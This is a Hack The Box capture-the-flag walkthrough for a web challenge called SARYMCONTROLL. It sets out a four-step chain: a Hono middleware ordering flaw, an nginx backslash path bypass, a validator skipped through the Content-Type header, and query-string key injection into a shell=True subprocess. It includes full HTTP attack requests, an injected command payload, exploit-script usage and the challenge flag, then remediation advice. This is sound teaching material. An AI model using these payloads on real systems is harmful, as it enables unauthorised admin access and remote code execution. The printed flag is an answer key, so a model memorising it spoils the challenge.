# SARYMCONTROLL - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | nginx → Hono (Node.js/TypeScript) → Python utils service |
| Flag location | `/flag.txt` |
| Flag | `HTB{wh3n_v4l1d4t0r_15nt_v4l1d4t1ng_5de24f75028a7b57030cf0fc513a33a5}` |

---

## Overview - How The App Works

Three internal services, only the first is public:

```
[You] ──→ nginx (port 80, public)
               │
               └──→ Hono app (port 3000, internal only)
                        │
                        └──→ Python utils service (port 5200, internal only)
```

nginx reverse proxies all traffic to Hono. Hono calls the Python utils service
when an admin runs satellite utility commands through the web UI.

**Goal:** reach `subprocess.run(..., shell=True)` in the Python utils service to
read `/flag.txt`. The only external path there is:

```
POST /api/admin/utils/execute  →  requires admin session
  └─ Hono calls http://127.0.0.1:5200/run?<query>
       └─ Python executes OS command
```

Full chain needed: **get admin access → trigger RCE**.

---

## Bug 1 - Hono Middleware Ordering (Missing Auth)

**File:** `src/routes.tsx`

In Hono (and Express-style frameworks), middleware runs in **registration order**.
Register a route first, add middleware later - the middleware **never runs** for
that route.

### The vulnerable code

```typescript
// src/routes.tsx

// Line 137 - route registered with NO requireAdmin
api.post('/admin/settings', settingsValidator, async (c) => {
  const body = await c.req.json<{
    registrationEnabled?: boolean;
    defaultRole?: string;
  }>();
  appService.updateSettings({
    registrationEnabled: body.registrationEnabled === true,
    defaultRole: (typeof body.defaultRole === 'string' ? body.defaultRole : 'user') as UserRole
  });
  return c.json({ redirectTo: withMessage('/admin/access', 'Access policy updated') });
});

// Line 153 - middleware registered AFTER the settings route - TOO LATE
api.use('/admin', requireAdmin);

// Line 154 - execute endpoint correctly uses inline requireAdmin
api.post('/admin/utils/execute', requireAdmin, async (c) => { ... });
```

When `POST /api/admin/settings` comes in, Hono matches line 137 and runs the
handler immediately. It never reaches line 153. `requireAdmin` is never called.

### What this lets us do

If we can reach the settings endpoint, we can enable registration and set
`defaultRole` - without ever logging in as admin.

---

## Bug 2 - nginx `location=` Bypass via Backslash

**File:** `config/nginx.conf`

The developer knew the settings endpoint lacked app-level auth, so they added
an nginx IP restriction:

```nginx
# config/nginx.conf

location = /api/admin/settings {
    allow 1.2.3.4;   # only this IP can reach it
    deny all;
    proxy_pass http://hono_upstream;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    ...
}

location / {
    proxy_pass http://hono_upstream;   # no IP restriction here
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    ...
}
```

The `=` modifier means **exact match only**. It fires only when the path is
precisely `/api/admin/settings`.

### The bypass: raw backslash

On Linux, `\` (ASCII 0x5C) is **not** a path separator. nginx treats it as a
literal character. So:

| Request path | nginx sees | nginx action |
|---|---|---|
| `/api/admin/settings` | `/api/admin/settings` | **403** - exact match fires, IP blocked |
| `/api/admin\settings` | `/api/admin\settings` | **passes** - no match, falls to `location /` |

nginx forwards `/api/admin\settings` to Hono without any IP check.

### Why Hono still routes it

`@hono/node-server` constructs the internal `Request` URL using the WHATWG URL API:

```javascript
// @hono/node-server/dist/listener.js (simplified)
const url = new URL(`${scheme}://${host}${incoming.url}`);
req[urlKey] = url.href;
```

The **WHATWG URL specification** requires that `\` in a URL path be treated as `/`.
Node.js follows this spec:

```javascript
// Demonstrated in Node.js:
new URL('http://host/api/admin\settings').pathname
// ⟹  '/api/admin/settings'   ← backslash normalised to forward slash
```

So Hono's `Request` object has `pathname = '/api/admin/settings'`, which matches
`api.post('/admin/settings', ...)` perfectly - the handler runs.

### Critical implementation note

The backslash **must be the raw byte 0x5C** in the HTTP request line. Python's
`requests` library percent-encodes `\` as `%5C`:

```python
# requests encodes \ as %5C - this DOES NOT WORK:
import requests
r = requests.Request('POST', 'http://host/api/admin\settings')
r.prepare().url
# ⟹  'http://host/api/admin%5Csettings'
```

`%5C` is NOT normalised by `new URL()` - it stays as `%5Csettings` and Hono
returns 404. Use `http.client` or raw sockets instead:

```python
# http.client preserves the raw backslash - this WORKS:
import http.client

conn = http.client.HTTPConnection('target', 80)
conn.request('POST', '/api/admin\x5csettings', body=..., headers=...)
resp = conn.getresponse()
# ⟹  HTTP 200 OK
```

---

## Bug 3 - Content-Type Bypass → Set `defaultRole = "admin"`

**Files:** `src/validators.ts`, `src/routes.tsx`

The settings validator explicitly blocks `"admin"` as a role:

```typescript
// src/validators.ts

export const settingsValidator = validator('json', (value, c) => {
  const body = value as SettingsPayload;
  const defaultRole = body.defaultRole;
  const roleString = (defaultRole ?? 'user').toString().toLowerCase().trim();

  if (!/^[a-zA-Z]+$/.test(roleString)) {
    return c.text('Default role must contain only alphabetic characters.', 400);
  }
  if (roleString === 'admin' || roleString.includes('admin')) {
    return c.text('Default role cannot be or contain "admin".', 400);
  }

  return { registrationEnabled, defaultRole: defaultRole as UserRole };
});
```

Sending `{"defaultRole": "admin"}` would normally get a 400. But there's a
discrepancy between what the **validator** sees and what the **handler** sees.

### How Hono's JSON validator works

```javascript
// hono/dist/validator/validator.js (actual compiled source)

var jsonRegex = /^application\/([a-z-\.]+\+)?json(;\s*[a-zA-Z0-9\-]+\=([^;]+))*$/;

var validator = (target, validationFunc) => {
  return async (c, next) => {
    let value = {};                              // ← starts as empty object

    const contentType = c.req.header("Content-Type");
    switch (target) {
      case "json":
        if (!contentType || !jsonRegex.test(contentType)) {
          break;                                 // ← BREAKS WITHOUT PARSING JSON
        }
        try {
          value = await c.req.json();            // only runs if CT matches
        } catch { ... }
        break;
      ...
    }

    const res = await validationFunc(value, c); // validator called with value
    ...
  };
};
```

When `Content-Type: text/plain`, the regex test **fails**, the switch breaks, and
`value` stays as `{}`.

### What the validator sees vs what the handler sees

```
Request body:  {"registrationEnabled": true, "defaultRole": "admin"}
Content-Type:  text/plain
               │
               ▼
┌─────────────────────────────────────────────────────┐
│  settingsValidator  (validator('json', fn))          │
│                                                      │
│  contentType = "text/plain"                          │
│  jsonRegex.test("text/plain") = false                │
│  → break  (no JSON parse)                           │
│  value = {}                                          │
│                                                      │
│  body.defaultRole = undefined                        │
│  roleString = "user"          ← default              │
│  "user" !== "admin"           ← PASSES ✓             │
└─────────────────────────────────────────────────────┘
               │  next()
               ▼
┌─────────────────────────────────────────────────────┐
│  Route handler                                       │
│                                                      │
│  const body = await c.req.json()  ← re-reads body!  │
│  // Node.js Request.json() ignores Content-Type      │
│  // parses raw bytes as JSON regardless              │
│                                                      │
│  body.defaultRole = "admin"   ← gets real value!    │
│  appService.updateSettings({ defaultRole: "admin" }) │
│  // 'as UserRole' is TypeScript-only, no runtime     │
│  // check - "admin" gets stored as-is                │
└─────────────────────────────────────────────────────┘
```

The bug is that the handler uses `c.req.json()` directly instead of
`c.req.valid('json')` (which would return the validator's sanitised output).

### Combined attack request (Step 1)

```http
POST /api/admin\settings HTTP/1.1
Host: <target>
Content-Type: text/plain
Content-Length: 53

{"registrationEnabled": true, "defaultRole": "admin"}
```

- `\` in path → nginx lets it through (Bug 2)
- `text/plain` → validator sees `{}`, passes (Bug 3)
- `c.req.json()` in handler → reads `"admin"` directly (Bug 3)
- No auth check → handler runs (Bug 1)

---

## Bug 4 - Query String Key Injection → RCE

**Files:** `src/services/satellite-utils-service.ts`, `utils/utils_service.py`

### Part A - The vulnerable Node.js function

The execute endpoint accepts a JSON body, validates the `command` field against
an allowlist, then passes the **entire parsed object** to `buildQueryFromJson`:

```typescript
// src/services/satellite-utils-service.ts

const allowedCommands = ['node_status', 'relay_health', 'downlink_queue', 'archive_sync_status'];

const buildQueryFromJson = (input: Record<string, unknown>) => {
  const pairs: string[] = [];
  for (const [key, value] of Object.entries(input)) {
    const encodedKey   = key;                  // ← KEY IS NOT URL-ENCODED
    const encodedValue = String(value ?? '');  // ← VALUE IS NOT URL-ENCODED EITHER
    pairs.push(`${encodedKey}=${encodedValue}`);
  }
  return pairs.join('&');
};

// In executeFromRawBody():
const parsed  = JSON.parse(rawBody);
const command = parsed.command.trim();

if (!isAllowedCommand(command)) {   // ← checks parsed.command only
  throw new Error('Command is not allowed');
}

const queryString = buildQueryFromJson(parsed);  // ← passes entire object!
const response    = await fetch(`${UTILS_ENDPOINT}?${queryString}`);
```

If a JSON key contains a literal `&`, it introduces an **extra query parameter**
when the key is concatenated into the query string.

### Part B - The vulnerable Python handler

```python
# utils/utils_service.py

COMMANDS = {
    "node_status":         ["sh", "-c", "echo node=ready && uptime"],
    "relay_health":        ["sh", "-c", "echo relay=stable && date -u"],
    "downlink_queue":      ["sh", "-c", "echo queued_packets=3 && echo backlog=low"],
    "archive_sync_status": ["sh", "-c", "echo sync=ok && echo lag_seconds=12"],
}

def do_GET(self):
    parsed_url = urlparse(self.path)
    query      = parse_qs(parsed_url.query, keep_blank_values=True)

    command_values = query.get("command", [])
    command_name   = command_values[0] if command_values else None  # ← takes FIRST value

    if isinstance(command_name, str) and command_name in COMMANDS:
        # safe - runs from the allowlist
        result = subprocess.run(COMMANDS[command_name], ...)
        return

    # command_name NOT in allowlist → falls through to shell=True RCE!
    result = subprocess.run(
        command_name,
        shell=True,          # ← executes arbitrary shell command
        capture_output=True,
        text=True,
        timeout=8,
    )
```

### Part C - The injection

We need Node.js to see `command = "node_status"` (passes allowlist), but Python
to see `command[0] = "cat /flag.txt"` (triggers shell).

**V8 preserves key insertion order in objects**, so by putting our injected key
**first**, Python's `parse_qs` will pick it as `command[0]`.

```
JSON body sent to Node.js:
  {"a&command": "cat%20/flag.txt", "command": "node_status"}
        │                                  │
        │   Node.js whitelist check:        │
        │   parsed.command = "node_status"  │
        │   ✓ passes isAllowedCommand()     │
        │                                  │
        ▼                                  ▼
buildQueryFromJson  (key NOT encoded):
  key="a&command"  value="cat%20/flag.txt"
  key="command"    value="node_status"
  ↓
  "a&command=cat%20/flag.txt" + "&" + "command=node_status"
  = "a&command=cat%20/flag.txt&command=node_status"
       ↑
       The & in the key name splits this into THREE params:
         a       = ""
         command = "cat%20/flag.txt"   ← FIRST occurrence
         command = "node_status"       ← second occurrence
```

Python `parse_qs` sees:

```python
query = {
    "a":       [""],
    "command": ["cat /flag.txt", "node_status"]  # %20 decoded to space
}
command_name = command_values[0]   # = "cat /flag.txt"
# "cat /flag.txt" NOT in COMMANDS → subprocess.run("cat /flag.txt", shell=True)
```

### Space encoding trick

Node.js's `fetch()` rejects URLs with literal spaces. Pass spaces as `%20` in the
JSON value. `buildQueryFromJson` copies it verbatim into the query string, then
Python's `parse_qs` decodes `%20` back to a space before handing it to the shell.

---

## Full Exploit Chain

### Step 1 - Bypass nginx + write settings (unauthenticated)

> **Requires raw socket** - `requests` encodes `\` as `%5C` which breaks the bypass.

```http
POST /api/admin\settings HTTP/1.1
Host: <target>
Content-Type: text/plain
Content-Length: 53

{"registrationEnabled": true, "defaultRole": "admin"}
```

Expected response:
```json
{"redirectTo": "/admin/access?message=Access%20policy%20updated"}
```

### Step 2 - Register a new account

```http
POST /api/auth/register HTTP/1.1
Host: <target>
Content-Type: application/json

{"username": "attacker", "password": "H@ck3rPass99!"}
```

Expected: `200 OK {"redirectTo": "/dashboard"}` - account created with role `admin`.

### Step 3 - Login

```http
POST /api/auth/login HTTP/1.1
Host: <target>
Content-Type: application/json

{"username": "attacker", "password": "H@ck3rPass99!"}
```

Expected: `200 OK` + `Set-Cookie: maintenance_session=<signed_token>`

### Step 4 - Confirm admin role

```http
GET /admin/overview HTTP/1.1
Host: <target>
Cookie: maintenance_session=<token>
```

Expected: `200 OK` with admin dashboard HTML.

### Step 5 - RCE via query string key injection

```http
POST /api/admin/utils/execute HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: maintenance_session=<token>

{"a&command": "cat%20/flag.txt", "command": "node_status"}
```

Expected:
```json
{"message": "Command completed", "output": "HTB{...}"}
```

Internal flow:
```
Node.js:  parsed.command = "node_status"  →  allowlist check passes
          buildQueryFromJson output: a&command=cat%20/flag.txt&command=node_status

Python:   parse_qs → command[0] = "cat /flag.txt"
          subprocess.run("cat /flag.txt", shell=True)  →  reads /flag.txt
```

---

## Running the Exploit Script

```bash
# Basic
python3 exploit_sarymcontroll.py http://<ip>:<port>

# Through Burp (default 127.0.0.1:8080)
python3 exploit_sarymcontroll.py http://<ip>:<port> --proxy

# Custom proxy
python3 exploit_sarymcontroll.py http://<ip>:<port> --proxy http://127.0.0.1:8080

# HTTPS with cert verification disabled
python3 exploit_sarymcontroll.py https://<ip>:<port> --proxy --no-verify

# Custom credentials
python3 exploit_sarymcontroll.py http://<ip>:<port> --username myuser --password MyPass1!
```

---

## Manual Testing in Burp

### Step 1 - Sending the raw backslash

Burp Repeater may percent-encode `\` automatically. To prevent this:

1. In Repeater, right-click the request path → **"Don't URL-encode these characters"**
   and add `\`
2. Or edit the raw request in the **Inspector** panel - type the path bytes manually
3. The request line must look exactly like:

```
POST /api/admin\settings HTTP/1.1
Host: <target>
Content-Type: text/plain
Content-Length: 53

{"registrationEnabled": true, "defaultRole": "admin"}
```

Verify the backslash is raw 0x5C (not `%5C`) using Burp's hex view.

### Step 5 - RCE payload

The JSON key must contain a literal `&` character. In Burp's request editor:

```
POST /api/admin/utils/execute HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: maintenance_session=<token>

{"a&command":"cat%20/flag.txt","command":"node_status"}
```

- The `&` in `"a&command"` is a literal ampersand inside the JSON key string.
- `%20` stays as the three characters `%`, `2`, `0` - it is **not** a URL-encoded
  space in the HTTP body. Python's `parse_qs` decodes it to a space later.

---

## Why These Bugs Matter (Real-World Context)

### Bug 1 - Middleware ordering

Extremely common in Express/Hono apps when auth middleware is added as an
afterthought. The fix is always to register middleware **before** the routes it
protects, or use inline middleware:

```typescript
// WRONG - middleware too late
api.post('/admin/settings', handler);
api.use('/admin', requireAdmin);   // never runs for /admin/settings

// CORRECT - inline
api.post('/admin/settings', requireAdmin, handler);
```

### Bug 2 - nginx backslash bypass

When a proxy uses exact-match location blocks (`location =`), any character the
proxy treats as literal but the upstream normalises creates a bypass window. The
WHATWG URL spec normalises `\` → `/`; nginx on Linux does not.

Fix: use a prefix match instead of exact match:
```nginx
location ^~ /api/admin/ {
    allow 1.2.3.4;
    deny all;
    proxy_pass http://hono_upstream;
}
```
Or enforce auth in the application, not the proxy.

### Bug 3 - Validator/handler discrepancy

Hono's `validator('json', fn)` silently returns `{}` when the Content-Type is
wrong. The handler re-reads the body with `c.req.json()` and gets the real value.

Fix: always read validated data via `c.req.valid('json')`, not `c.req.json()`:

```typescript
// WRONG - re-reads raw body, bypasses validation
const body = await c.req.json();

// CORRECT - uses the already-validated, sanitised value
const body = c.req.valid('json');
```

### Bug 4 - Query string injection + shell=True

Building query strings by concatenating keys without URL-encoding is always
dangerous. Use `URLSearchParams`:

```typescript
// WRONG - keys not encoded, & in key injects extra params
const qs = Object.entries(obj).map(([k,v]) => `${k}=${v}`).join('&');

// CORRECT - keys and values both properly encoded
const qs = new URLSearchParams(obj as Record<string,string>).toString();
```

And never use `subprocess.run(..., shell=True)` with user-controlled input.
Use `shell=False` with a fixed argument list:

```python
# WRONG
subprocess.run(command_name, shell=True, ...)

# CORRECT
subprocess.run(COMMANDS[command_name], shell=False, ...)
```
